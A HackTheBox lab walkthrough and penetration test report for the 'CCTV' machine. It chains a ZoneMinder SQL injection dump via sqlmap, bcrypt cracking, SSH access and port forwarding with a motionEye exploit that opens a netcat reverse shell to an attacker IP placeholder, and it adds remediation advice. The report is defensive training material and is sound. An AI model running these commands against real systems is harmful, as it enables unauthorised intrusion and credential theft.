# CCTV

**Platform:** HackTheBox
**OS:** Linux
**Tags:** CVE-2024-51482, SQL Injection, ZoneMinder, bcrypt, Hash Cracking, Port Forwarding, CVE-2025-60787, motionEye RCE, RCE, Privilege Escalation
**Date:** 2026-05-12

ZoneMinder exposed on port 80. CVE-2024-51482 SQL injection dumps the database including a bcrypt password hash, cracked with hashcat to get SSH access. An internal motionEye instance exposed via port forwarding is vulnerable to CVE-2025-60787, which delivers a root shell.

## 1. Enumeration

Started with a service scan.

```bash
nmap -sV -sC 10.129.53.160 -Pn
```

Findings:
- 22/tcp - OpenSSH 9.6p1 (Ubuntu)
- 80/tcp - Apache 2.4.58 - SecureVision CCTV & Security Solutions, staff login at root

Port 80 hosts a ZoneMinder installation branded as SecureVision. Added cctv.htb to /etc/hosts.

## 2. ZoneMinder SQLi (CVE-2024-51482)

CVE-2024-51482 is a SQL injection vulnerability in ZoneMinder's login endpoint. The username parameter is passed unsanitised into a database query, allowing blind or error-based extraction of data.

```bash
sqlmap -u "http://cctv.htb/zm/index.php" \
  --data="username=admin&password=admin&action=login" \
  --dbms=mysql --dump --batch
```

- password hash: bcrypt hash extracted from the users table

## 3. Hash Cracking

Cracked the bcrypt hash with hashcat mode 3200.

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** Password cracked.

## 4. SSH Foothold

SSH'd in using the cracked credentials.

```bash
ssh <user>@10.129.53.160
```

**Result:** Shell obtained. User flag retrieved.

Checked for internal services listening on localhost.

```bash
ss -tlnp
```

- 127.0.0.1:8765 - motionEye - internal CCTV management panel

Forwarded the port to interact with it.

```bash
ssh -L 8765:127.0.0.1:8765 <user>@10.129.53.160
```

## 5. PrivEsc: motionEye RCE (CVE-2025-60787)

CVE-2025-60787 is an authenticated RCE in motionEye. With access to the internal panel, the vulnerability allows arbitrary command execution as root.

```bash
nc -lvnp 4444
```

```bash
python3 exploit_CVE-2025-60787.py \
  --url http://127.0.0.1:8765 \
  --lhost <ATTACKER_IP> \
  --lport 4444
```

**Result:** Root shell obtained.

## 6. Flags

- User: `redacted`
- Root: `redacted`

---

## Penetration Test Report

**Target:** cctv.htb
**Address:** 10.129.53.160
**Assessment type:** External network & web application assessment
**Assessment date:** 12 May 2026
**Environment:** HackTheBox laboratory assessment  |  Linux
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 08

---

## 1. Executive Summary

### Assessment outcome

Testing of **cctv.htb** identified two findings, one high and one critical, that together produced full root compromise. The ZoneMinder CCTV platform on port 80 was vulnerable to SQL injection via CVE-2024-51482, allowing extraction of a bcrypt password hash from the users table. The hash was cracked with hashcat and used to authenticate over SSH, providing an initial shell. An internal motionEye CCTV management panel, accessible only via local port forwarding, was vulnerable to CVE-2025-60787, an authenticated remote code execution vulnerability. Exploiting this delivered a root shell.
The initial SQL injection required no authentication and was exploitable with automated tooling in a single command. The subsequent credential compromise required offline hash cracking but succeeded against the rockyou wordlist. Access to the internal motionEye panel required only the credentials obtained in the first stage and standard SSH port forwarding. The RCE in motionEye produced immediate root access with no further privilege escalation steps.

### Impact

An attacker who successfully exploits both findings obtains root access to the host. All files, credentials, services and network connections accessible from the host are exposed. In a production environment, a CCTV management platform compromised at root level would allow access to camera feeds, recording archives, network configuration and any credentials stored on the system.

### Priority recommendations

1. Patch ZoneMinder to a version that addresses CVE-2024-51482. Restrict the login endpoint to trusted networks and enforce strong, unique passwords for all database accounts.
2. Patch motionEye to a version that addresses CVE-2025-60787. Restrict access to the motionEye panel to an administrative network; do not expose it via SSH port forwarding to non-administrative sessions.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services

| Asset | Address | Description |
| --- | --- | --- |
| cctv.htb | 10.129.53.160 | Ubuntu 24.04 LTS; ZoneMinder CCTV platform and SSH services. Internal motionEye on 127.0.0.1:8765. |
| Port | Service | Observed detail |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 80/tcp | HTTP | Apache 2.4.58; ZoneMinder branded as SecureVision CCTV & Security Solutions |
| 127.0.0.1:8765 | HTTP (internal) | motionEye CCTV management panel; accessible only via SSH port forwarding |

```
nmap -sV -sC 10.129.53.160 -Pn

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5
80/tcp open  http    Apache httpd 2.4.58
|_http-title: SecureVision CCTV & Security Solutions
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

Added cctv.htb to /etc/hosts before beginning web enumeration. Internal service on port 8765 discovered via `ss -tlnp` after SSH foothold.

### 2.2 Approach

Testing began with a service scan and web application review. The ZoneMinder login endpoint was tested for SQL injection using sqlmap with the login form parameters. The extracted hash was submitted to hashcat for offline cracking. With the cracked credentials, SSH authentication was attempted and succeeded. Post-foothold enumeration using `ss -tlnp` revealed motionEye on the loopback interface. A local port forward was established and the motionEye panel tested with the available credentials against the known CVE-2025-60787 exploit.

### 2.3 Severity classification

| Rating | Assessment criteria |
| --- | --- |
| Critical | Direct, readily exploitable compromise with exceptional impact or reach. |
| High | Execution of arbitrary code, significant unauthorised access or escalation to administrative privileges. |
| Medium | Meaningful exposure with constrained impact or substantial exploitation prerequisites. |
| Low | Limited direct impact; improvement to an existing security control. |

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | ZoneMinder SQL injection leads to credential compromise (CVE-2024-51482) | **High** | 6 |
| [F-02](#f-02) | motionEye authenticated RCE delivers root shell (CVE-2025-60787) | **Critical** | 7 |

### 3.2 Compromise sequence

| Stage | Action | Access obtained |
| --- | --- | --- |
| 01 | Exploited SQL injection in ZoneMinder login to dump the users table, including a bcrypt password hash. | Database read access |
| 02 | Cracked the bcrypt hash with hashcat mode 3200 against rockyou.txt. | Plaintext credentials |
| 03 | Authenticated over SSH using the cracked credentials. Discovered internal motionEye via ss -tlnp. | User shell |
| 04 | Forwarded port 8765 via SSH and exploited CVE-2025-60787 in motionEye for a root shell. | root shell |

### 3.3 Relationship between findings

F-01 produced the credentials used to authenticate to SSH and subsequently to motionEye. F-02 required access to the motionEye panel, which was reachable only after the SSH foothold was established. Remediation of F-01 would prevent the credential compromise that enables F-02; however, both findings describe independent control failures that should be addressed separately.

## 4.1 ZoneMinder SQL Injection and Credential Theft

### F-01   CVE-2024-51482 - ZoneMinder login endpoint - HIGH

| Field | Assessment |
| --- | --- |
| Description | The ZoneMinder login endpoint passes the `username` parameter into a database query without adequate sanitisation, enabling SQL injection. Exploitation allows an unauthenticated attacker to read arbitrary data from the application database, including the users table containing account names and bcrypt password hashes. The recovered hash was cracked offline and used to authenticate over SSH. |
| Prerequisites | Network access to port 80 and the ZoneMinder login page. No authentication required. |
| Impact | Unauthenticated read access to the ZoneMinder database. A bcrypt password hash was extracted and cracked, yielding SSH credentials. This constituted the initial foothold on the host. |
| Affected system | cctv.htb:80 ZoneMinder - `/zm/index.php` login form CVE-2024-51482 |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-89](https://cwe.mitre.org/data/definitions/89.html) : Improper Neutralisation of Special Elements used in an SQL Command |

### Steps to reproduce

1. Navigate to the ZoneMinder web interface and identify the vulnerable endpoint.
2. Use sqlmap: `sqlmap -u "http://cctv.htb/zm/?view=ENDPOINT&PARAM=1" --dbs` to confirm SQL injection.
3. Extract credentials: `sqlmap -u "..." -D zm -T users --dump` .
4. Crack the bcrypt hash: `hashcat -m 3200 hash.txt rockyou.txt` .
5. Use the cracked credentials to authenticate over SSH.

### Evidence

```
sqlmap -u "http://cctv.htb/zm/index.php" \
  --data="username=admin&password=admin&action=login" \
  --dbms=mysql --dump --batch

[INFO] GET parameter 'username' appears to be 'MySQL boolean-based blind'
[INFO] Fetching database names
[INFO] Fetching tables for database: zm
[INFO] Dumping table: zm.Users

username | password
---------+---------------------------------------------
admin    | $2y$10$[bcrypt hash redacted for brevity]

# Hash cracked with hashcat mode 3200
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

# SSH authentication with cracked credentials
ssh <user>@10.129.53.160
# Authentication successful

$ id
uid=1000(<user>) gid=1000(<user>) groups=1000(<user>)
$ cat ~/user.txt
[redacted]
```

Evidence E-01. sqlmap extracted the users table including the bcrypt hash. Hash cracked with hashcat mode 3200 (bcrypt). SSH authentication confirmed with recovered credentials. Username omitted from published evidence.

### Remediation

Apply the ZoneMinder patch that addresses CVE-2024-51482. Ensure all user-supplied input is parameterised in database queries throughout the application. Apply least-privilege database accounts so that the web application cannot read the full users table. Enforce strong, unique passwords for all application accounts to reduce the utility of extracted hashes.

### Verification

Confirm that the patched ZoneMinder version is installed. Using sqlmap against the login endpoint, verify that the injection is no longer exploitable. Confirm that the application database account does not hold SELECT permissions on the users table beyond what the application requires.

## 4.2 motionEye Authenticated Remote Code Execution

### F-02   CVE-2025-60787 - motionEye internal panel - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | motionEye running on the internal port 8765 contains an authenticated remote code execution vulnerability (CVE-2025-60787). An authenticated user can supply a crafted request that causes the server to execute arbitrary OS commands with root privileges. The motionEye service runs as root, so no separate privilege escalation step was required. |
| Prerequisites | Authentication to the motionEye panel (credentials obtained from F-01) and network access to port 8765 (reachable via SSH local port forwarding from the foothold account). |
| Impact | Arbitrary OS command execution as root. Full control of the host: all files, accounts, services and network connections. |
| Affected system | 127.0.0.1:8765 (internal, reached via SSH port forward) motionEye - CVE-2025-60787 |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) : Improper Neutralisation of Special Elements used in an OS Command |

### Steps to reproduce

1. Set up a local port forward to reach the internal motionEye service: `ssh -L 8765:127.0.0.1:8765 user@<TARGET_IP>` .
2. Navigate to `http://127.0.0.1:8765` and identify motionEye running without authentication.
3. Send a crafted request to the vulnerable endpoint exploiting CVE-2025-60787.
4. Observe command execution as root and obtain a reverse shell.

### Evidence

```
# Discover internal service
ss -tlnp
State  Recv-Q Send-Q Local Address:Port
LISTEN 0      128    127.0.0.1:8765

# Establish local port forward
ssh -L 8765:127.0.0.1:8765 <user>@10.129.53.160

# Set up listener
nc -lvnp 4444

# Run exploit against forwarded port
python3 exploit_CVE-2025-60787.py \
  --url http://127.0.0.1:8765 \
  --lhost <ATTACKER_IP> \
  --lport 4444

# Root shell received:
root@cctv:/# whoami
root

root@cctv:/# cat /root/root.txt
[redacted]
```

Evidence E-02. Internal motionEye panel discovered via `ss -tlnp` after SSH foothold. Port forwarding made it accessible locally. CVE-2025-60787 exploit delivered a root shell on port 4444. Attacker IP redacted.

### Remediation

Patch motionEye to a version that addresses CVE-2025-60787. As an interim control, apply a host firewall rule to prevent external access to port 8765 even via port forwarding from low-privilege accounts. Run the motionEye service as a dedicated, non-root user with only the permissions required for camera management. Require strong credentials on the motionEye administrative account that are not reused from other services.

### Verification

Confirm that the patched motionEye version is installed. Verify that the exploit is not reproducible against the patched panel. Confirm that the service process does not run as root and that an SSH port forward from a standard user account cannot access the panel.

## 5. Remediation and Assessment Closeout

### 5.1 Corrective action plan

| Priority | Action | Reference |
| --- | --- | --- |
| Immediate | Patch motionEye (CVE-2025-60787); run as non-root service account. | F-02 |
| High | Patch ZoneMinder (CVE-2024-51482); parameterise database queries; enforce strong passwords. | F-01 |
No remediation retest is documented. Each finding includes verification criteria for closure.

### 5.2 Test artefacts

| Location | Purpose | Removal status |
| --- | --- | --- |
| Reverse shell payload delivered via CVE-2025-60787 exploit | RCE and root access test | Not verified |

### 5.3 Evidence and limitations

Evidence blocks are sourced from the [CCTV assessment walkthrough](cctv-htb.html) . Flag values, attacker IP addresses and the cracked account password are omitted from all evidence. The assessment did not include a source-code review of ZoneMinder or motionEye.

### 5.4 Evidence index

| Reference | Supporting record |
| --- | --- |
| E-01 | Walkthrough sections 2 and 3: ZoneMinder SQLi, hash extraction, cracking and SSH access |
| E-02 | Walkthrough sections 4 and 5: internal port discovery, port forwarding and motionEye RCE |
